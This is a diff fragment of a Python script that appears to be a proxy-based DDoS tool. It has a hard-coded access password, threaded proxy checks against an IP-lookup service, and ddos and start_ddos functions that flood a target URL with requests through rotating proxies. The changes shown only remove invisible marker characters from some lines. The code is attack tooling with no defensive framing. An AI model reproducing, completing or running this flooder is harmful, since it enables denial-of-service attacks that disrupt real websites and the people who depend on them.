@@ -36,7 +36,7 @@ print("""
 ‎\033[96m╚════════════════════════════════════════════════
 ‎""")
 ‎‎# Password authentication function
-‎def authenticate():
+def authenticate():
     ‎password = "BASe" # The password to access the tool
     ‎user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
 ‎
@@ -45,7 +45,7 @@ print("""
        attemps += 1
        ‎exit()
 ‎
-‎def check_prox(array, url):
+def check_prox(array, url):
 ‎	ip = r.post("http://ip.beget.ru/").text
 ‎	for prox in array:
 ‎		thread_list = []
@@ -53,7 +53,7 @@ print("""
 ‎		thread_list.append(t)
 ‎		t.start()
 ‎
-‎def check(ip, prox, url):
+def check(ip, prox, url):
 ‎	try:
 ‎		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
 ‎	except:
@@ -64,7 +64,7 @@ print("""
 ‎		thread_list.append(t)
 ‎		t.start()
 ‎
-‎def ddos(prox, url):
+def ddos(prox, url):
 ‎	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
 ‎	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
 ‎	color = random.choice(colors)
@@ -75,7 +75,7 @@ print("""
 ‎		thread_list.append(t)
 ‎		t.start()
 ‎
-‎def start_ddos(prox, url, headers, proxies, color):
+def start_ddos(prox, url, headers, proxies, color):
 ‎	try:
 ‎		s = r.Session()
 ‎		req = s.get(url, headers=headers, proxies=proxies)
